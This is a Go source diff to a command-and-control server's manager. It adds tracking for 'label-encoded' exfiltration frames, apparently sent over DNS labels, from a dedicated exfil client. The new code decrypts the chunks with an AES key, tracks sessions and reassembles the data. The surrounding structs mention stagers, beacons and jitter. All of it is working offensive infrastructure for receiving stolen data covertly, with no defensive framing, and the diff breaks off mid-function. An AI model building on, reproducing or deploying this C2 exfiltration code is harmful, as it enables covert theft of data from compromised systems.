@@ -85,6 +85,17 @@ type ExfilSession struct {
 	LastChunkAt    time.Time
 }
 
+// ExfilTagTracker keeps state for label-encoded exfil frames that reference session tags.
+type ExfilTagTracker struct {
+	Tag          string
+	SessionID    uint32
+	JobID        uint32
+	TotalFrames  uint32
+	TotalChunks  uint32
+	CreatedAt    time.Time
+	LastActivity time.Time
+}
+
 // StagerSession tracks a stager deployment session
 type StagerSession struct {
 	ClientIP        string
@@ -108,6 +119,7 @@ type C2Manager struct {
 	resultChunks         map[string][]ResultChunk        // key: taskID (legacy)
 	expectedResults      map[string]*ExpectedResult      // key: taskID (new two-phase)
 	exfilSessions        map[string]*ExfilSession        // key: session hex string
+	exfilTagIndex        map[string]*ExfilTagTracker     // key: normalized session tag
 	stagerSessions       map[string]*StagerSession       // key: clientIP
 	cachedStagerSessions map[string]*CachedStagerSession // key: sessionID (for cache-based sessions)
 	recentMessages       map[string]time.Time            // key: message hash, value: timestamp (deduplication)
@@ -160,6 +172,7 @@ func NewC2Manager(debug bool, encryptionKey string, jitterConfig StagerJitter, d
 		resultChunks:         make(map[string][]ResultChunk),
 		expectedResults:      make(map[string]*ExpectedResult),
 		exfilSessions:        make(map[string]*ExfilSession),
+		exfilTagIndex:        make(map[string]*ExfilTagTracker),
 		stagerSessions:       make(map[string]*StagerSession),
 		cachedStagerSessions: make(map[string]*CachedStagerSession),
 		recentMessages:       make(map[string]time.Time),
@@ -521,6 +534,11 @@ func (c2 *C2Manager) cleanupExpiredSessions() {
 				delete(c2.exfilSessions, sessionID)
 			}
 		}
+		for tag, tracker := range c2.exfilTagIndex {
+			if now.Sub(tracker.LastActivity) > ExfilSessionTimeout {
+				delete(c2.exfilTagIndex, tag)
+			}
+		}
 		c2.mutex.Unlock()
 		for _, expired := range expiredExfilSessions {
 			if c2.debug {
@@ -642,11 +660,166 @@ func (c2 *C2Manager) decodeBeaconData(encoded string) (string, error) {
 	return decoded, nil
 }
 
-// handleExfilChunk ingests a dedicated exfil client's chunk and tracks session progress.
-func (c2 *C2Manager) handleExfilChunk(encoded string, meta *ExfilMetadata, clientIP string) (bool, error) {
-	plaintext, err := decodeAndDecryptBytes(encoded, c2.aesKey)
+// ProcessExfilFrame consumes a label-encoded exfil frame emitted by the dedicated client.
+func (c2 *C2Manager) ProcessExfilFrame(frame *ExfilFrame, clientIP string) (bool, error) {
+	if frame == nil {
+		return false, fmt.Errorf("nil exfil frame")
+	}
+
+	switch frame.Phase {
+	case ExfilFrameInit:
+		c2.recordExfilInit(frame.SessionTag, frame.Counter)
+		return true, nil
+	case ExfilFrameChunk:
+		if frame.Payload == "" {
+			return false, fmt.Errorf("chunk frame missing payload")
+		}
+		if frame.Counter == 0 {
+			return c2.handleExfilMetadataFrame(frame, clientIP)
+		}
+		return c2.handleExfilDataFrame(frame, clientIP)
+	case ExfilFrameComplete:
+		return c2.handleExfilCompletionFrame(frame.SessionTag)
+	default:
+		return false, fmt.Errorf("unknown exfil frame phase: %v", frame.Phase)
+	}
+}
+
+func (c2 *C2Manager) recordExfilInit(tag string, totalFrames uint32) {
+	now := time.Now()
+	c2.mutex.Lock()
+	tracker := c2.ensureExfilTagTrackerLocked(tag, now)
+	tracker.TotalFrames = totalFrames
+	if totalFrames > 0 {
+		tp := totalFrames - 1
+		if tracker.TotalChunks == 0 || tracker.TotalChunks < tp {
+			tracker.TotalChunks = tp
+		}
+	}
+	c2.mutex.Unlock()
+}
+
+func (c2 *C2Manager) handleExfilMetadataFrame(frame *ExfilFrame, clientIP string) (bool, error) {
+	plaintext, err := decodeAndDecryptBytes(frame.Payload, c2.aesKey)
 	if err != nil {
-		return false, fmt.Errorf("exfil decrypt failed: %w", err)
+		return false, fmt.Errorf("exfil metadata decrypt failed: %w", err)
+	}
+
+	meta, err := parseExfilMetadataPayload(plaintext)
+	if err != nil {
+		return false, fmt.Errorf("exfil metadata parse failed: %w", err)
+	}
+	meta.PayloadLen = uint16(len(plaintext))
+
+	now := time.Now()
+	c2.mutex.Lock()
+	tracker := c2.ensureExfilTagTrackerLocked(frame.SessionTag, now)
+	tracker.SessionID = meta.SessionID
+	tracker.JobID = meta.JobID
+	if meta.TotalChunks != 0 {
+		tracker.TotalChunks = meta.TotalChunks
+		if meta.TotalChunks < ^uint32(0) {
+			tracker.TotalFrames = meta.TotalChunks + 1
+		}
+	}
+	c2.mutex.Unlock()
+
+	return c2.handleExfilChunk(frame.Payload, meta, clientIP, plaintext)
+}
+
+func (c2 *C2Manager) handleExfilDataFrame(frame *ExfilFrame, clientIP string) (bool, error) {
+	tracker, ok := c2.getExfilTagTracker(frame.SessionTag)
+	if !ok || tracker.SessionID == 0 {
+		return false, fmt.Errorf("unknown exfil session tag %s", frame.SessionTag)
+	}
+
+	meta := &ExfilMetadata{
+		Version:     ExfilProtocolVersion,
+		SessionID:   tracker.SessionID,
+		JobID:       tracker.JobID,
+		ChunkIndex:  frame.Counter,
+		TotalChunks: tracker.TotalChunks,
+	}
+	if tracker.TotalChunks == 0 {
+		meta.TotalChunks = frame.Counter
+	}
+	if meta.TotalChunks != 0 && frame.Counter == meta.TotalChunks {
+		meta.Flags |= ExfilFlagFinalChunk
+	}
+
+	return c2.handleExfilChunk(frame.Payload, meta, clientIP, nil)
+}
+
+func (c2 *C2Manager) handleExfilCompletionFrame(tag string) (bool, error) {
+	tracker, ok := c2.getExfilTagTracker(tag)
+	if !ok || tracker.SessionID == 0 {
+		return false, fmt.Errorf("unknown exfil session for completion")
+	}
+
+	sessionID := fmt.Sprintf("%08x", tracker.SessionID)
+	c2.mutex.RLock()
+	session, exists := c2.exfilSessions[sessionID]
+	c2.mutex.RUnlock()
+	if exists {
+		go c2.finalizeExfilSession(session)
+	}
+	c2.deleteExfilTagTracker(tag)
+
+	return true, nil
+}
+
+func (c2 *C2Manager) ensureExfilTagTrackerLocked(tag string, now time.Time) *ExfilTagTracker {
+	normalized := normalizeExfilTag(tag)
+	tracker, exists := c2.exfilTagIndex[normalized]
+	if !exists {
+		tracker = &ExfilTagTracker{
+			Tag:          normalized,
+			CreatedAt:    now,
+			LastActivity: now,
+		}
+		c2.exfilTagIndex[normalized] = tracker
+	} else {
+		tracker.LastActivity = now
+	}
+	return tracker
+}
+
+func (c2 *C2Manager) getExfilTagTracker(tag string) (*ExfilTagTracker, bool) {
+	normalized := normalizeExfilTag(tag)
+	c2.mutex.Lock()
+	defer c2.mutex.Unlock()
+	tracker, exists := c2.exfilTagIndex[normalized]
+	if !exists {
+		return nil, false
+	}
+	tracker.LastActivity = time.Now()
+	copyTracker := *tracker
+	return &copyTracker, true
+}
+
+func (c2 *C2Manager) deleteExfilTagTracker(tag string) {
+	c2.mutex.Lock()
+	delete(c2.exfilTagIndex, normalizeExfilTag(tag))
+	c2.mutex.Unlock()
+}
+
+func normalizeExfilTag(tag string) string {
+	return strings.ToUpper(tag)
+}
+
+// handleExfilChunk ingests a dedicated exfil client's chunk and tracks session progress.
+func (c2 *C2Manager) handleExfilChunk(encoded string, meta *ExfilMetadata, clientIP string, plaintextOverride []byte) (bool, error) {
+	var (
+		plaintext []byte
+		err       error
+	)
+	if plaintextOverride != nil {
+		plaintext = plaintextOverride
+	} else {
+		plaintext, err = decodeAndDecryptBytes(encoded, c2.aesKey)
+		if err != nil {
+			return false, fmt.Errorf("exfil decrypt failed: %w", err)
+		}
 	}
 
 	if meta.PayloadLen != 0 && int(meta.PayloadLen) != len(plaintext) && c2.debug {
